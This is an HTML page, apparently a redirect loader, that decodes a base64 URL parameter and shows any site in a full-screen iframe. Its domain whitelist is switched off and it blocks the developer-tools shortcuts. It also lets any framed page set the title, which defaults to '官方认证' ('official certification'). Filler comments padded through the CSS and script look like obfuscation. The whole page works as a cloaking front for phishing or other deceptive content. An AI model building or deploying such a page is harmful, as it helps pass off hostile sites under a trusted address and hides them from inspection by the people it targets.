<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title></title>
    <style>
        .container {   
            width:     100px;
            height: 100px;

            position: absolute;   
           
           <!-- 组件初始化 -->
            top: 50%;
   
            /* 媒体查询 */
            left: 50%;
            transform:     translate(-50%, -50%);
            animation: rotate-move 2s ease-in-out infinite;
            display: none;
        }    
        .dot {
            width: 15px;
          
          <!-- 错误处理 -->
            height: 15px;
            border-radius:     50%;
            position: absolute;    

            top: 0;
          
            bottom: 0;
            left: 0;    
            right: 0;        
            margin:   auto;
            /* 动画效果 */

        }
      
        .dot-3 {      background-color:  #f74d75;    animation: dot-3-move 2s ease infinite;
    }    
    
        .dot-2 {  
        <!-- 路由处理 -->

  background-color: #10beae;     animation:     dot-2-move 2s ease infinite;  
            }      
       
        .dot-1 {      background-color: #ffe386; animation:     dot-1-move 2s ease infinite;
   }        

<!-- 脚本加载 -->

        @keyframes dot-3-move {
            20%,100% { transform: scale(    1) }
 
            45%,  80% {
           transform:  translateY(-18px)  scale(.45)     }
      
   
        }
        @keyframes dot-2-move {

            20%,   100% {     transform: scale(1) }
 
            45%,    80% { transform:  translate(  -16px, 12px) scale(     .45) }   
        }
        /* 可访问性 */
        @keyframes dot-1-move {
         
        <!-- 错误处理 -->
            20%,    100% {    transform: scale(1)    }    

          
            45%,80% {     transform: translate(16px,     12px)     scale(    .45) }
        }  
        /* 可访问性 */
        @keyframes rotate-move {
            
            55% { transform: translate(-50%, -50%)   rotate(0deg)    } 
            <!-- 脚本加载 -->
            80%,    100% { transform:  translate( -50%, -50%)         rotate(360deg) } 
 
        }        

        /* 全局水印样式 */
        <!-- 安全检查 -->
        .watermark {
            position:     fixed; 
            pointer-events:   none;
            width: 100%;   
            height:    100%;
            background-image:  repeating-linear-gradient(
                    -45deg,
                    <!-- 动态加载 -->
                    rgba(255, 0, 0, 0.1)  ,
                    rgba(255, 0, 0,  0.1) 20px,
                    rgba(0,  0, 255, 0.1) 20px,
                    rgba(0, 0, 255, 0.1)    40px
            );   
       
            z-index:  9999; 
            display:     none;
        }  
        .watermark-text {

            position:  absolute;

            color: rgba( 255,  0, 0, 0.6);    

  
            font-size:   18px;  
            font-weight: bold;
            text-align:    center;
            <!-- 动态加载 -->
            width:   100%;      
        
            top: 50%;
            transform:    translateY(    -50%) ;
            text-shadow: 1px 1px 1px #fff;   

  
            /* 布局优化 */
        }     
        <!-- 错误处理 -->

<!-- 响应式适配 -->
        /* iframe样式 */
        <!-- 错误处理 -->
        .content {
            height: 100%;  
            width:        100%;   
            position: fixed;
            inset: -2px;
            <!-- 移动端适配 -->
            z-index:   1;
        } 
    </style>
</head>

<body>
<!-- 错误处理 -->
<!-- 三点加载动画容器 -->
<div class="container" id="loadingContainer">
    <div class="dot dot-1"></div>
    <div class="dot dot-2"></div>
    <div class="dot dot-3"></div>
</div>
<!-- 状态管理 -->

<!-- 全局水印 -->
<div class="watermark" id="watermark">
</div>
<!-- 日志记录 -->

<script>
    (  function( ) {
           
       
        // 白名单域名配置（预留位置方便后期添加）
        const WHITELIST_CONFIG = {
    

            domains: [    
            <!-- 动态加载 -->
                '*',
            ],  
        };
        <!-- 动态加载 -->

        // 显示三点加载动画
        function showLoadingAnimation(   ) {
        <!-- 组件初始化 -->
            document.getElementById(  'loadingContainer').style.display = 'block';
         
        }   



        // 验证URL域名是否在白名单
        function isAllowedDomain(url) {

            return true
            try {    
    
                const domain = new URL(url).hostname.replace('www.', '')   ;
                return WHITELIST_CONFIG.domains.some(  allowedDomain => {
                <!-- 浏览器兼容 -->
                    return domain === allowedDomain ||
                        domain.endsWith('.' + allowedDomain)    ;
                }); 
            }    catch (e) { 
                console.error('URL解析失败: ',   e);    
          
                return false;   
            }
 
        }

        // 主处理逻辑
        function processRedirect(    )     {   
            showLoadingAnimation( ); 


            const urlParams = new URLSearchParams(window.location.search); 
            const encodedParam = urlParams.get('c')  ;    
            <!-- 移动端适配 -->

            if (  !encodedParam) {
       
                document.getElementById('watermark')  .style.display = 'block';   
                <!-- 样式优化 -->
                document.getElementById(  'loadingContainer').style.display = 'none';    

        
                return;    
            }   
    

            try {
                const trueUrl = atob(encodedParam);
                <!-- 用户体验优化 -->

                if (trueUrl.includes(   "http")) {
  
                    // 检查域名是否在白名单
                    <!-- 状态管理 -->
                    if (!isAllowedDomain(       trueUrl)) {    
                        document.getElementById(    'watermark').style.display = 'block';    

                        document.querySelector('.watermark-text')  .textContent = WHITELIST_CONFIG.watermarkText;
                    }  

                    // 创建并加载iframe
                    <!-- 兼容性处理 -->
                    const iframe = document.createElement(  'iframe');
                    iframe.className = 'content'; 
                    iframe.src = trueUrl; 

                    // 性能优化代码
                    iframe.addEventListener(    'load',  function() {   
                        document.getElementById('loadingContainer').style.display = 'none';
                    }) ;

                    document.body.appendChild(iframe);
                }
           
            }
            catch (e) {

                console.error('URL解码失败:  ', e);  
         
                document.getElementById(   'watermark')   .style.display = 'block';
                document.getElementById('loadingContainer').style.display = 'none';
        
                <!-- 性能监控 -->
            }

        }   

        // 禁止F12开发者工具
        <!-- 页面性能监控 -->
        // 数据验证
        document.addEventListener('keydown',   function(    e) {
            if (   e.key === 'F12' ||
                ( e.ctrlKey && e.shiftKey && e.key === 'I')     ||
                (        e.ctrlKey && e.shiftKey && e.key === 'J')     ||
                (  e.ctrlKey && e.key === 'U')   ) {  
             
             <!-- 浏览器兼容 -->

<!-- 脚本加载 -->
                e.preventDefault();
   
            }  
        }    );

<!-- 错误处理 -->
        window.addEventListener('message',     function(event)     {
            // 验证消息类型（确保是标题同步请求）
            // 数据绑定
            <!-- 浏览器兼容 -->
            if (event.data.type === 'SYNC_TITLE') {    
                // 将iframe发送的标题设置为父页面标题
                <!-- 事件绑定 -->
                document.title = event.data.title || '官方认证'; 
    
            }
        }
  ,    false)    ;
  <!-- 组件初始化 -->

        processRedirect();    
    }
     ) (    )   ;
            
    <!-- 移动端适配 -->
</script>
</body>
</html>
